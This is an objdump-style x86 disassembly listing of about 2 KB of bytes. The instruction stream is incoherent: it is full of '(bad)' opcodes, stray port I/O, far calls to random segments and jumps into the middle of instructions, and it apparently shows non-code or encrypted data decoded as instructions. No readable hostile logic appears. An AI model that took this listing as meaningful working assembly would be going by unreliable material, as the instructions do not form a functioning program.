  412ed9:	mov    eax,ds:0x25375aeb
  412ede:	xchg   bh,al
  412ee0:	ins    BYTE PTR es:[edi],dx
  412ee1:	mov    eax,0x49a13bc0
  412ee6:	cmp    ah,BYTE PTR [ecx]
  412ee8:	sub    bh,BYTE PTR [eax]
  412eea:	imul   esp,DWORD PTR [ecx],0xb0605327
  412ef0:	es int 0x22
  412ef3:	jle    0x412ec8
  412ef5:	call   0x7432db09
  412efa:	mov    al,BYTE PTR [ebx+0x7d9e2993]
  412f00:	pop    edi
  412f01:	ins    BYTE PTR es:[edi],dx
  412f02:	mov    bl,0xf5
  412f04:	xchg   BYTE PTR [eax-0x123f0203],ah
  412f0a:	fimul  DWORD PTR [edi]
  412f0c:	add    al,0x3e
  412f0e:	add    edi,ebx
  412f10:	ror    ebx,cl
  412f12:	imul   eax,DWORD PTR [ebp+0x24],0x13
  412f16:	push   esp
  412f17:	aas    
  412f18:	sti    
  412f19:	test   BYTE PTR [esi-0x79],cl
  412f1c:	add    esp,DWORD PTR [ebp-0x35]
  412f1f:	mul    DWORD PTR [edx-0xe77ec3d]
  412f25:	lock popf 
  412f27:	push   edx
  412f28:	mov    ebp,DWORD PTR [ebx-0x4b]
  412f2b:	push   esp
  412f2c:	or     cl,BYTE PTR [edx-0x15]
  412f2f:	mov    WORD PTR [ecx-0x3ab962a7],ss
  412f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f36:	cld    
  412f37:	inc    edx
  412f38:	outs   dx,BYTE PTR ds:[esi]
  412f39:	mov    ch,0x9c
  412f3b:	push   es
  412f3c:	sub    dl,BYTE PTR [eax+ebp*4]
  412f3f:	inc    edx
  412f40:	fmul   st,st(1)
  412f42:	sar    ah,cl
  412f44:	lods   eax,DWORD PTR ds:[esi]
  412f45:	in     eax,0x38
  412f47:	and    al,0x73
  412f49:	sbb    DWORD PTR [edi+ecx*4-0x51],ebp
  412f4d:	sub    edi,DWORD PTR [ebx]
  412f4f:	sub    DWORD PTR [ebp+0x9],esp
  412f52:	or     DWORD PTR [ebx-0x55a9692c],ebx
  412f58:	cs push edx
  412f5a:	add    eax,0x4b215774
  412f5f:	jae    0x412f42
  412f61:	fimul  DWORD PTR [edi]
  412f63:	div    BYTE PTR [eax-0x1a]
  412f66:	cmp    eax,ebx
  412f68:	cmp    edi,DWORD PTR [edi-0xbd27353]
  412f6e:	xchg   esi,eax
  412f6f:	sbb    DWORD PTR [eax-0x30a40550],edi
  412f75:	adc    DWORD PTR [ecx-0x7],0x89c51b1e
  412f7c:	dec    eax
  412f7d:	mov    ebp,0xa278f872
  412f82:	pop    ss
  412f83:	sub    esp,ebp
  412f85:	iret   
  412f86:	dec    edx
  412f87:	mov    BYTE PTR [ecx],bl
  412f89:	jno    0x412fa1
  412f8b:	adc    DWORD PTR [ebx+0x57391f5b],ecx
  412f91:	in     eax,0xb9
  412f93:	arpl   WORD PTR [edi],di
  412f95:	xchg   esi,eax
  412f96:	repz test DWORD PTR [edx+0x9c076a],edx
  412f9d:	mov    dh,0x66
  412f9f:	push   eax
  412fa0:	mov    bh,al
  412fa2:	scas   eax,DWORD PTR es:[edi]
  412fa3:	fwait
  412fa4:	sti    
  412fa5:	jo     0x413023
  412fa7:	pop    ebp
  412fa8:	sbb    eax,0x44caed9c
  412fad:	jg     0x412f9a
  412faf:	enter  0x3c81,0xaf
  412fb3:	fidivr WORD PTR [ecx]
  412fb5:	loop   0x413023
  412fb7:	ds add eax,0x7e0220fd
  412fbd:	mov    ax,0xdf29
  412fc1:	fisttp WORD PTR [eax]
  412fc3:	dec    esi
  412fc4:	mov    cl,0xbc
  412fc6:	cmp    DWORD PTR [ecx],eax
  412fc8:	outs   dx,BYTE PTR ds:[esi]
  412fc9:	jmp    0x412f83
  412fcb:	or     bh,dl
  412fcd:	adc    ebx,DWORD PTR [edi+0x2f]
  412fd0:	inc    edi
  412fd1:	and    bl,BYTE PTR [edx-0x4e]
  412fd4:	call   0x33af2ab1
  412fd9:	jge    0x412fa0
  412fdb:	sbb    dl,ch
  412fdd:	and    ah,dl
  412fdf:	xor    edi,DWORD PTR [ecx]
  412fe1:	and    eax,0xb67d220f
  412fe6:	push   eax
  412fe7:	and    edi,ebx
  412fe9:	outs   dx,BYTE PTR ds:[esi]
  412fea:	repz lahf 
  412fec:	xchg   ebp,eax
  412fed:	xchg   BYTE PTR [edi-0x74],ch
  412ff0:	fcomp  QWORD PTR [ebx-0xe31d3ca]
  412ff6:	push   ds
  412ff7:	call   0x33dc:0xe59fdb07
  412ffe:	ret    0xd736
  413001:	aad    0xed
  413003:	popf   
  413004:	pop    dx
  413006:	ror    DWORD PTR [esi],1
  413008:	sub    DWORD PTR [eax-0xecda361],ebp
  41300e:	fidiv  DWORD PTR ds:0x4f1a04f7
  413014:	shl    BYTE PTR [edi+ecx*1-0x34],cl
  413018:	jae    0xd061e2ad
  41301e:	xchg   ebp,eax
  41301f:	or     al,0xe1
  413021:	(bad)  
  413023:	inc    esi
  413024:	cmp    dh,BYTE PTR [ecx]
  413026:	dec    edx
  413027:	dec    esp
  413028:	inc    esi
  413029:	jns    0x412ffd
  41302b:	sbb    al,0xbf
  41302d:	dec    edx
  41302e:	xchg   esi,eax
  41302f:	js     0x412fcb
  413031:	out    0x53,al
  413033:	add    BYTE PTR [esi],ch
  413035:	adc    esi,esi
  413037:	idiv   WORD PTR [eax-0x66]
  41303b:	(bad)  
  41303c:	xchg   ebx,eax
  41303d:	xor    BYTE PTR [edi],0x30
  413040:	adc    ebx,ecx
  413042:	xor    DWORD PTR [edi],edx
  413044:	mov    ds:0xafab069c,eax
  413049:	jp     0x41300b
  41304b:	add    ebx,DWORD PTR [eax-0x428004cb]
  413051:	int3   
  413052:	cmp    ecx,ebp
  413054:	les    ebx,FWORD PTR [edx]
  413056:	lock cmp DWORD PTR [eax+0x75],eax
  41305a:	aaa    
  41305b:	xchg   esi,eax
  41305c:	pop    ebp
  41305d:	xchg   DWORD PTR [edx+edx*2],ebp
  413060:	jecxz  0x413067
  413062:	rcl    DWORD PTR [edx+0x228da060],cl
  413068:	xor    BYTE PTR [ebx],cl
  41306a:	or     eax,0x62ea0a05
  41306f:	sbb    eax,0x1c0a64bf
  413074:	dec    DWORD PTR [edx]
  413076:	add    al,0xe9
  413078:	jbe    0x4130cd
  41307a:	retf   0x2511
  41307d:	in     al,0xf4
  41307f:	sbb    ecx,DWORD PTR [edi+0x20]
  413082:	ret    0x82c5
  413085:	dec    esp
  413086:	or     ebp,DWORD PTR ds:0x225dd13e
  41308c:	xor    DWORD PTR [edx+eiz*4-0x2e1a523f],ecx
  413093:	push   ds
  413094:	imul   DWORD PTR [ecx-0x6b9f6666]
  41309a:	clc    
  41309b:	inc    esi
  41309c:	push   eax
  41309d:	call   0xde3e:0xf02efea9
  4130a4:	lds    ecx,FWORD PTR [edx]
  4130a6:	dec    esp
  4130a7:	sub    edx,ebp
  4130a9:	jle    0x413031
  4130ab:	pop    eax
  4130ac:	mov    eax,0x5d7a8227
  4130b1:	adc    bh,ah
  4130b3:	sub    cl,bh
  4130b5:	psadbw mm2,QWORD PTR [esi]
  4130b8:	pop    esp
  4130b9:	outs   dx,DWORD PTR ds:[esi]
  4130ba:	aaa    
  4130bb:	sbb    eax,0x1b48f383
  4130c0:	outs   dx,DWORD PTR ds:[esi]
  4130c1:	dec    esp
  4130c2:	int    0xd3
  4130c4:	das    
  4130c5:	inc    esi
  4130c6:	pusha  
  4130c7:	push   cs
  4130c8:	add    DWORD PTR [edi+ebx*1],ebx
  4130cb:	push   ds
  4130cc:	inc    esi
  4130cd:	inc    eax
  4130ce:	mov    ebp,0x9960fc3c
  4130d3:	ret    
  4130d4:	out    dx,al
  4130d5:	jbe    0x41313e
  4130d7:	repz or al,0x35
  4130da:	mov    bl,0xea
  4130dc:	push   eax
  4130dd:	not    DWORD PTR [esi+0x41f981aa]
  4130e3:	retf   
  4130e4:	jp     0x413099
  4130e6:	push   ss
  4130e7:	jmp    0x20e6:0x591e730f
  4130ee:	xor    al,0xc9
  4130f0:	jmp    0xffb5:0x5381ecce
  4130f7:	adc    eax,0x69151433
  4130fc:	stos   DWORD PTR es:[edi],eax
  4130fd:	sti    
  4130fe:	mov    al,0xb5
  413100:	push   eax
  413101:	xor    ah,BYTE PTR [ebx-0x61f5987d]
  413107:	lods   al,BYTE PTR ds:[esi]
  413108:	lods   al,BYTE PTR ds:[esi]
  413109:	call   0x2054:0x953e8e61
  413110:	xor    DWORD PTR [ebp+0x26],0x9a8af5c9
  413117:	data16 cmp bl,dl
  41311a:	sub    BYTE PTR [ecx+0x24],0x16
  41311e:	jecxz  0x413185
  413120:	ret    0x8170
  413123:	inc    ecx
  413124:	lahf   
  413125:	fild   WORD PTR [ebp-0x1818388a]
  41312b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41312d:	xchg   BYTE PTR [esi],ch
  41312f:	popf   
  413130:	dec    edi
  413131:	dec    esi
  413132:	dec    edi
  413133:	stos   DWORD PTR es:[edi],eax
  413134:	(bad)  
  413135:	jge    0x413136
  413137:	inc    ebx
  413138:	in     eax,0x35
  41313a:	ss ja  0x413148
  41313d:	shl    edi,cl
  41313f:	jmp    0x41312d
  413141:	mul    DWORD PTR [ecx+eiz*4]
  413144:	mov    al,ds:0x45d7246c
  413149:	js     0x413162
  41314b:	(bad)  
  41314c:	js     0x4131b8
  41314e:	ret    0xe69e
  413151:	pop    edi
  413152:	fcomp  QWORD PTR [edx+0x6c]
  413155:	cmp    eax,0x8a4f7efb
  41315a:	out    0xa8,eax
  41315c:	inc    esi
  41315d:	ds inc ebx
  41315f:	jl     0x41311b
  413161:	stos   DWORD PTR es:[edi],eax
  413162:	pop    edi
  413163:	in     al,0x38
  413165:	loope  0x413133
  413167:	sti    
  413168:	stos   DWORD PTR es:[edi],eax
  413169:	repz dec BYTE PTR [eax]
  41316c:	mov    ch,0x47
  41316e:	sub    eax,DWORD PTR [eax]
  413170:	mov    es,WORD PTR [edi-0x84d53eb]
  413176:	call   0xa11943aa
  41317b:	fisttp DWORD PTR [eax+0x50]
  41317e:	xchg   edx,eax
  41317f:	lds    esp,FWORD PTR [ebx-0x46a03bec]
  413185:	es push cs
  413187:	adc    esi,edx
  413189:	je     0x4131b5
  41318b:	mov    DWORD PTR [ebp+0x15],eax
  41318e:	jo     0x41313b
  413190:	shl    BYTE PTR [edi-0x39],0x5a
  413194:	xor    BYTE PTR [edi+0x6835ba46],bh
  41319a:	xor    edx,DWORD PTR [esi]
  41319c:	ds mov ebp,edx
  41319f:	cli    
  4131a0:	or     eax,0xd85cdf2e
  4131a5:	or     DWORD PTR [edi+0x2b60c390],edx
  4131ab:	sahf   
  4131ac:	test   DWORD PTR [eax+ebx*8],esp
  4131af:	sub    BYTE PTR [edi+0x6404657],0x0
  4131b6:	not    DWORD PTR [edx+0x3d93f7c2]
  4131bc:	sub    ch,BYTE PTR [esi-0x43]
  4131bf:	dec    ecx
  4131c0:	mov    dh,0xd8
  4131c2:	aad    0xc1
  4131c4:	cs jmp 0xefd7e59c
  4131ca:	aaa    
  4131cb:	push   esi
  4131cc:	pop    ebp
  4131cd:	test   al,0xc7
  4131cf:	xor    BYTE PTR [ebp-0x29aca4e9],dh
  4131d5:	shr    BYTE PTR [eax+ebp*4-0x4],cl
  4131d9:	pop    esi
  4131da:	pop    esi
  4131db:	in     al,dx
  4131dc:	and    BYTE PTR [edx+0x3],bh
  4131df:	xlat   BYTE PTR ds:[ebx]
  4131e0:	inc    ecx
  4131e1:	out    dx,al
  4131e2:	retf   0x3e9a
  4131e5:	or     al,0xc9
  4131e7:	cmp    ch,BYTE PTR [edx+0x18]
  4131ea:	mov    ch,0xd7
  4131ec:	jp     0x413223
  4131ee:	add    bh,cl
  4131f0:	xchg   edi,eax
  4131f1:	test   DWORD PTR [ebp+0x296aff3b],ebx
  4131f7:	jbe    0x413231
  4131f9:	addr16 inc bp
  4131fc:	inc    eax
  4131fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fe:	and    al,0xca
  413200:	shl    dl,cl
  413202:	xchg   BYTE PTR [ebx],cl
  413204:	lahf   
  413205:	shr    esp,0xed
  413208:	mov    dl,BYTE PTR [ebx+0x56b4aac9]
  41320e:	mov    ch,0x76
  413210:	adc    eax,0xad23f6de
  413215:	(bad)  
  413216:	or     BYTE PTR [edi-0x4],al
  413219:	fbld   TBYTE PTR [edi+0x77]
  41321c:	retf   0xc91
  41321f:	sahf   
  413220:	or     al,0xdf
  413222:	shr    DWORD PTR [esp+eax*4+0x44],0xef
  413227:	sbb    cl,dl
  413229:	shl    cl,0xae
  41322c:	in     eax,0x77
  41322e:	xor    al,0x39
  413230:	push   esi
  413231:	push   es
  413232:	mov    edi,0x5e06d67d
  413237:	div    esi
  413239:	xor    BYTE PTR [edi-0x6],ch
  41323c:	push   esp
  41323d:	in     eax,dx
  41323e:	lock or edx,DWORD PTR [eax+0x5363dd47]
  413245:	and    BYTE PTR [esp+eiz*8],dh
  413248:	call   0xe8aa:0xcb5cfb7b
  41324f:	cs pop es
  413251:	pop    esi
  413252:	xor    bh,dl
  413254:	xor    al,0x8e
  413256:	push   edx
  413257:	in     al,0x25
  413259:	mov    fs,WORD PTR [edx]
  41325b:	ret    
  41325c:	fst    DWORD PTR [ebp-0x49ec9ecd]
  413262:	cs sbb ch,0x87
  413266:	dec    ecx
  413267:	cmp    ebp,DWORD PTR [ebx-0xa]
  41326a:	retf   
  41326b:	test   al,0x6
  41326d:	push   eax
  41326e:	mov    al,0x15
  413270:	mov    ds:0x2f53bd04,al
  413275:	or     DWORD PTR [eax],ebp
  413277:	xchg   esi,eax
  413278:	gs cli 
  41327a:	iret   
  41327b:	stc    
  41327c:	(bad)  
  41327d:	sahf   
  41327e:	bound  eax,QWORD PTR [eax+ebp*4+0xe15afcf]
  413285:	rol    ebp,1
  413287:	pop    eax
  413288:	push   ss
  413289:	pusha  
  41328a:	mov    bh,BYTE PTR [esi-0x469aae0d]
  413290:	in     al,dx
  413291:	cmp    eax,0x762e700c
  413296:	inc    edi
  413297:	add    BYTE PTR [ecx-0x63],ch
  41329a:	in     eax,0x27
  41329c:	pop    es
  41329d:	xchg   BYTE PTR [ebp-0x51],dh
  4132a0:	pop    esi
  4132a1:	xor    al,0x2c
  4132a3:	test   eax,0xdb37bff0
  4132a8:	mov    eax,ds:0x3b9b624d
  4132ad:	popf   
  4132ae:	daa    
  4132af:	pop    ss
  4132b0:	xchg   ecx,eax
  4132b1:	fwait
  4132b2:	or     DWORD PTR [edx+0x4b],ebx
  4132b5:	(bad)  
  4132b6:	neg    dh
  4132b8:	(bad)  
  4132b9:	shr    BYTE PTR [ecx-0x64d270e0],1
  4132bf:	dec    esp
  4132c0:	rol    esi,cl
  4132c2:	dec    ecx
  4132c3:	stos   BYTE PTR es:[edi],al
  4132c4:	add    al,0x7c
  4132c6:	shr    BYTE PTR [ebx+ebp*1-0x49],cl
  4132ca:	pop    ebp
  4132cb:	pop    eax
  4132cc:	mov    esi,0xdc6a6b47
  4132d1:	inc    edi
  4132d2:	mov    dh,0x50
  4132d4:	out    0xb1,eax
  4132d6:	(bad)  
  4132d7:	ins    BYTE PTR es:[edi],dx
  4132d8:	mov    ebx,0xa5bf878d
  4132dd:	dec    ebx
  4132de:	ja     0x413289
  4132e0:	mov    al,ds:0x89abde5e
  4132e5:	or     DWORD PTR ds:0xca760209,0xbe51bbb8
  4132ef:	sub    ecx,edi
  4132f1:	test   ebp,0xcd69d88a
  4132f7:	cs (bad) 
  4132f9:	adc    al,0x4
  4132fb:	retf   
  4132fc:	mov    esp,0xd0256421
  413301:	scas   al,BYTE PTR es:[edi]
  413302:	in     eax,dx
  413303:	ins    BYTE PTR es:[edi],dx
  413304:	pop    es
  413305:	jmp    0x41329f
  413307:	mov    ds:0xcc1fb314,al
  41330c:	xchg   DWORD PTR [ebp+eax*8-0x42],eax
  413310:	inc    ebx
  413311:	pop    esi
  413312:	push   ss
  413313:	outs   dx,DWORD PTR ds:[esi]
  413314:	xchg   edx,eax
  413315:	mov    bl,0x50
  413317:	gs mov eax,0x17f40f
  41331d:	loopne 0x41335a
  41331f:	cbw    
  413321:	and    eax,0xca47add4
  413326:	xor    dh,BYTE PTR [ebx+0x3e]
  413329:	cs fwait
  41332b:	adc    eax,DWORD PTR [esi-0x51]
  41332e:	xor    edi,eax
  413330:	mov    bl,0xf9
  413332:	and    edi,eax
  413334:	pop    es
  413335:	inc    eax
  413336:	jns    0x4133a8
  413338:	in     eax,0x6a
  41333a:	aam    0x26
  41333c:	jge    0x413331
  41333e:	data16 mov cl,0x22
  413341:	push   esi
  413342:	mov    ebx,0xd5b1ee6f
  413347:	inc    ebx
  413348:	mov    ebx,0x24f40efe
  41334d:	jnp    0x4132fe
  41334f:	add    eax,0x9ce1fd8f
  413354:	sbb    eax,DWORD PTR [ebp-0x3bba1783]
  41335a:	cmp    eax,0x3d22f35f
  41335f:	push   cs
  413360:	aas    
  413361:	jecxz  0x413351
  413363:	in     eax,0x8e
  413365:	push   edi
  413366:	ja     0x413342
  413368:	imul   ecx,DWORD PTR [ebp+0x50415a95],0xffffffdc
  41336f:	cmc    
  413370:	cs (bad) 
  413372:	out    0xc3,eax
  413374:	sbb    al,0x3c
  413376:	jle    0x4133c1
  413378:	and    eax,0x843ecdf1
  41337d:	sti    
  41337e:	cmp    al,0xea
  413380:	or     al,bl
  413382:	sbb    al,0x85
  413384:	(bad)  
  413385:	cmp    bl,BYTE PTR [ebx]
  413387:	out    dx,eax
  413388:	mov    ebx,0xaed1d9cf
  41338d:	call   0x44b32f35
  413392:	ret    
  413393:	pop    ebx
  413394:	adc    eax,0xe34e3d5c
  413399:	inc    esi
  41339a:	icebp  
  41339b:	cmp    eax,0x869ead25
  4133a0:	or     al,0xc6
  4133a2:	arpl   dx,bx
  4133a4:	or     eax,0x731397fd
  4133a9:	imul   esi,DWORD PTR [edi],0x30
  4133ac:	pop    ds
  4133ad:	cmp    BYTE PTR [esi+0x21],dl
  4133b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b1:	test   al,0x66
  4133b3:	cli    
  4133b4:	xchg   BYTE PTR [ebx+ecx*4],ah
  4133b7:	aad    0xd1
  4133b9:	retf   
  4133ba:	int    0xe2
  4133bc:	sbb    al,0x72
  4133be:	js     0x4133e7
  4133c0:	sahf   
  4133c1:	aam    0xb7
  4133c3:	sahf   
  4133c4:	ins    BYTE PTR es:[edi],dx
  4133c5:	or     ebx,DWORD PTR [esp+eax*4-0x380da2ee]
  4133cc:	mov    es,WORD PTR [eax+esi*4-0x6a]
  4133d0:	sub    DWORD PTR [edx+0x15],0x7114abe3
  4133d7:	sbb    BYTE PTR [edi],bl
  4133d9:	or     eax,0xd26620aa
  4133de:	pushf  
  4133df:	mov    al,0x80
  4133e1:	and    al,0x39
  4133e3:	pop    edi
  4133e4:	test   al,0x55
  4133e6:	fwait
  4133e7:	aaa    
  4133e8:	add    BYTE PTR [ebx],dh
  4133ea:	mov    dh,0x73
  4133ec:	int    0x2d
  4133ee:	dec    esp
  4133ef:	aad    0x61
  4133f1:	adc    cl,ah
  4133f3:	xor    edx,esi
  4133f5:	mov    bh,BYTE PTR [ebp-0x1818c69a]
  4133fb:	pop    ebx
  4133fc:	xchg   esi,eax
  4133fd:	ror    DWORD PTR [ecx*1-0x5b16cb72],0xe5
  413405:	xchg   ecx,ecx
  413407:	mov    al,ds:0xfac7593a
  41340c:	fbstp  TBYTE PTR ds:0x86692ced
  413412:	lods   eax,DWORD PTR ds:[esi]
  413413:	lods   al,BYTE PTR ds:[esi]
  413414:	jecxz  0x4133c9
  413416:	out    0x17,eax
  413418:	cmc    
  413419:	push   eax
  41341a:	and    DWORD PTR [esi-0x34],edi
  41341d:	clc    
  41341e:	push   eax
  41341f:	fnstenv [edx+0x62f135cb]
  413425:	(bad)  
  413427:	mov    esp,0xacb6165b
  41342c:	inc    esp
  41342d:	fistp  QWORD PTR [edi-0x1]
  413430:	lahf   
  413431:	jp     0x4133e3
  413433:	repz mov bh,ch
  413436:	cmp    BYTE PTR [edx-0x6b991cda],bh
  41343c:	sahf   
  41343d:	enter  0x2449,0x84
  413441:	sbb    BYTE PTR [eax-0x5ad29cbc],ch
  413447:	dec    eax
  413448:	inc    esp
  413449:	loope  0x4134b7
  41344b:	es in  al,0x85
  41344e:	(bad)  
  41344f:	idiv   BYTE PTR [ecx+0x2d]
  413452:	jno    0x4133f8
  413454:	div    DWORD PTR [eax+0x52]
  413457:	xchg   edi,eax
  413458:	fs add bh,dh
  41345b:	pop    esi
  41345c:	mov    al,0xb0
  41345e:	sub    BYTE PTR [esi-0xd087ac],ah
  413464:	push   ecx
  413465:	imul   ebp,ebx,0xfa0be27d
  41346b:	dec    esi
  41346c:	or     al,bh
  41346e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41346f:	call   0x3a20423d
  413474:	jecxz  0x4134ea
  413476:	dec    esi
  413477:	jecxz  0x413439
  413479:	repnz setge bh
  41347d:	adc    cl,BYTE PTR [ebp+edi*4-0x7b]
  413481:	dec    edx
  413482:	push   esp
  413483:	call   0x4132:0x9390155b
  41348a:	lea    edi,ds:[eax-0x3c574a30]
  413491:	div    BYTE PTR [eax]
  413493:	jge    0x41343f
  413495:	mov    ch,0x79
  413497:	cmc    
  413498:	and    bl,BYTE PTR [ebx]
  41349a:	std    
  41349b:	mov    esi,0x7bd1156d
  4134a0:	xchg   ebp,eax
  4134a1:	fild   QWORD PTR [edx+0x67a66279]
  4134a7:	pop    ds
  4134a8:	xchg   ecx,eax
  4134a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134aa:	inc    esp
  4134ab:	mov    cl,0x5f
  4134ad:	(bad)  
  4134ae:	or     eax,0x15b4646f
  4134b3:	jecxz  0x4134d8
  4134b5:	push   0xcef1e531
  4134ba:	test   al,0xf
  4134bc:	jmp    0x4134e4
  4134be:	dec    esp
  4134bf:	push   cs
  4134c0:	sub    bl,BYTE PTR [edx-0x71]
  4134c3:	iret   
  4134c4:	cmp    BYTE PTR [edi],ch
  4134c6:	dec    esp
  4134c7:	add    BYTE PTR [edx-0x37c49a73],al
  4134cd:	mov    WORD PTR [esi],?
  4134cf:	xchg   ebx,eax
  4134d0:	mov    dl,0xf2
  4134d2:	mov    esi,0x2dd68ca
  4134d7:	imul   ebp,eax,0x53
  4134da:	mov    bh,dh
  4134dc:	outs   dx,BYTE PTR ds:[esi]
  4134dd:	inc    ecx
  4134de:	ds mov esi,0xe3a82b13
  4134e4:	push   cs
  4134e5:	inc    ebx
  4134e6:	dec    edi
  4134e7:	mov    ebp,0x50e67519
  4134ec:	int    0x55
  4134ee:	in     al,dx
  4134ef:	dec    esp
  4134f0:	sub    DWORD PTR [ebx+0x5f9fefa4],esi
  4134f6:	rcl    BYTE PTR [ecx],0x9a
  4134f9:	(bad)  
  4134fb:	dec    edi
  4134fc:	pop    edx
  4134fd:	jae    0x413549
  4134ff:	outs   dx,BYTE PTR ds:[esi]
  413500:	iret   
  413501:	iret   
  413502:	xchg   esi,eax
  413503:	(bad)  
  413504:	in     al,dx
  413505:	int    0xde
  413507:	je     0x413574
  413509:	test   DWORD PTR [ecx+0xf],esi
  41350c:	dec    edx
  41350d:	mov    esi,0xaa5caa22
  413512:	das    
  413513:	ds inc eax
  413515:	out    0x25,eax
  413517:	and    DWORD PTR [edi],0x3
  41351a:	sub    edx,0x58
  41351d:	imul   esi,ecx,0x646de78a
  413523:	ja     0x4134d9
  413525:	icebp  
  413526:	inc    edx
  413527:	enter  0xc3c0,0x20
  41352b:	pop    edx
  41352c:	mov    ecx,DWORD PTR [ebx+edx*8]
  41352f:	sbb    al,0x64
  413531:	or     DWORD PTR [ecx+0x59],esp
  413534:	push   ds
  413535:	imul   eax
  413537:	sar    DWORD PTR [edi+0x551ada1],1
  41353d:	(bad)
  413540:	xlat   BYTE PTR ds:[ebx]
  413541:	pushfw 
  413543:	mov    ch,0x33
  413545:	fs out 0xee,eax
  413548:	test   al,0x55
  41354a:	repnz dec esi
  41354c:	xor    edi,esp
  41354e:	outs   dx,BYTE PTR ds:[esi]
  41354f:	jbe    0x4135ca
  413551:	arpl   WORD PTR [edx],cx
  413553:	push   ds
  413554:	jmp    0xaf6b:0xf8e5ef76
  41355b:	icebp  
  41355c:	dec    ecx
  41355d:	in     eax,dx
  41355e:	xchg   edi,eax
  41355f:	jb     0x41351d
  413561:	ss adc al,0xfe
  413564:	imul   ebp,DWORD PTR [ecx+0x3e5b68a5],0xfffffff5
  41356b:	and    dl,0x8e
  41356e:	icebp  
  41356f:	clc    
  413570:	jmp    0x7bc:0x89dd6329
  413577:	stos   BYTE PTR es:[edi],al
  413578:	ja     0x4135c0
  41357a:	test   BYTE PTR [ecx],dh
  41357c:	push   ebx
  41357d:	mov    al,ds:0xdb34c685
  413582:	fisubr WORD PTR [esi]
  413584:	push   ss
  413585:	xchg   esi,eax
  413586:	call   0x7306749f
  41358b:	jge    0x4135c2
  41358d:	test   al,0xfe
  41358f:	out    0x7e,eax
  413591:	lods   eax,DWORD PTR ds:[esi]
  413592:	call   0x16c5:0xe63b36ad
  413599:	psubsw mm5,QWORD PTR [ebp+0x65afdc2a]
  4135a0:	inc    ebx
  4135a1:	arpl   di,bp
  4135a3:	fs int 0x8a
  4135a6:	dec    edi
  4135a7:	clc    
  4135a8:	xchg   ch,ch
  4135aa:	inc    edx
  4135ab:	ret    
  4135ac:	pushf  
  4135ad:	jb     0x4135d2
  4135af:	shl    bh,0xee
  4135b2:	mov    bl,BYTE PTR [esi+0x2947fdd5]
  4135b8:	fs daa 
  4135ba:	adc    BYTE PTR [eiz*4-0x4aff9446],bl
  4135c1:	dec    eax
  4135c2:	cs push 0xd889f1da
  4135c8:	out    0x6,eax
  4135ca:	outs   dx,BYTE PTR ds:[esi]
  4135cb:	sbb    DWORD PTR [eax],0xe8213057
  4135d1:	adc    edi,DWORD PTR [edi-0x36]
  4135d4:	call   0x17b052ce
  4135d9:	pop    ebx
  4135da:	shl    DWORD PTR [ebx+0x26],cl
  4135dd:	idiv   ch
  4135df:	push   eax
  4135e0:	sahf   
  4135e1:	loop   0x4135c7
  4135e3:	gs sbb al,0xfe
  4135e6:	dec    ebx
  4135e7:	cmp    DWORD PTR [ecx+0x40],esi
  4135ea:	aaa    
  4135eb:	add    edx,DWORD PTR [edi+0x5f]
  4135ee:	inc    edi
  4135ef:	dec    edi
  4135f0:	in     al,0xff
  4135f2:	lods   eax,DWORD PTR ds:[esi]
  4135f3:	mov    cl,0x9f
  4135f5:	xor    BYTE PTR [edx+0x44],dl
  4135f8:	les    ecx,FWORD PTR [edi]
  4135fa:	loope  0x4135c8
  4135fc:	xor    BYTE PTR [eax-0x6],0x75
  413600:	sar    ah,0xe4
  413603:	in     al,dx
  413604:	add    ecx,edx
  413606:	cmp    cl,BYTE PTR [eax+0x4]
  413609:	cwde   
  41360a:	cmp    eax,0x19537d46
  41360f:	xchg   ebp,eax
  413610:	adc    ecx,DWORD PTR [edi-0x4048e857]
  413616:	adc    eax,DWORD PTR [edx]
  413618:	pop    eax
  413619:	mov    eax,0xe617bac3
  41361e:	cmp    eax,0x2b5d5e58
  413623:	ss cmp cl,bl
  413626:	int    0xd2
  413628:	adc    esp,DWORD PTR [ebp+0x695e5818]
  41362e:	pop    esp
  41362f:	adc    eax,0xea91b332
  413634:	xchg   edx,eax
  413635:	push   esp
  413636:	xchg   esp,eax
  413637:	dec    esp
  413638:	jne    0x4135de
  41363a:	push   eax
  41363b:	pushf  
  41363c:	push   edi
  41363d:	pop    ss
  41363e:	dec    edi
  41363f:	lods   eax,DWORD PTR ds:[esi]
  413640:	sbb    ebx,eax
  413642:	in     al,0xfb
  413644:	fisttp WORD PTR [eax+0x27]
  413647:	dec    edi
  413648:	ficomp DWORD PTR [ebx+0x58184916]
  41364e:	je     0x41365e
  413650:	(bad)  
  413651:	lods   al,BYTE PTR ds:[esi]
  413652:	jnp    0x4135d7
  413654:	mov    ah,0x91
  413656:	fcomp  st(5)
  413658:	jg     0x41368b
  41365a:	imul   edi,DWORD PTR [esi],0x2a
  41365d:	xchg   edi,eax
  41365e:	test   al,0x74
  413660:	pop    ebp
  413661:	and    eax,ebp
  413663:	cmp    DWORD PTR [esi-0x3c],edx
  413666:	dec    eax
  413667:	sub    al,0x5a
  413669:	retf   0xd911
  41366c:	loope  0x413601
  41366e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41366f:	rcr    DWORD PTR [edx+edi*8+0x0],1
  413673:	addr16 cmp bl,ah
  413676:	ds sbb al,0xad
  413679:	sub    eax,0x434311a0
  41367e:	cmp    ah,bh
  413680:	pop    edx
  413681:	loop   0x413628
  413683:	mov    bl,0xff
  413685:	pop    ds
  413686:	pop    ecx
  413687:	jp     0x413637
  413689:	in     eax,dx
  41368a:	push   es
  41368b:	daa    
  41368c:	push   esi
  41368d:	ret    
  41368e:	xor    al,0xac
  413690:	into   
  413691:	mov    ds:0x5bc22e2e,al
  413696:	call   0x1345:0x13857948
  41369d:	jg     0x413634
  41369f:	xlat   BYTE PTR ds:[ebx]
  4136a0:	cmp    BYTE PTR ds:0x7f97356a,0xb0
  4136a7:	int3   
  4136a8:	cld    
  4136a9:	pop    ds
  4136aa:	je     0x4136f8
  4136ac:	push   ebx
  4136ad:	f2xm1  
  4136af:	call   0xe1cfdbb0
  4136b4:	sti    
  4136b5:	pop    eax
  4136b6:	shl    DWORD PTR [ebx+0x1090cb2c],1
  4136bc:	jp     0x4136d2
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	mov    ah,0x26
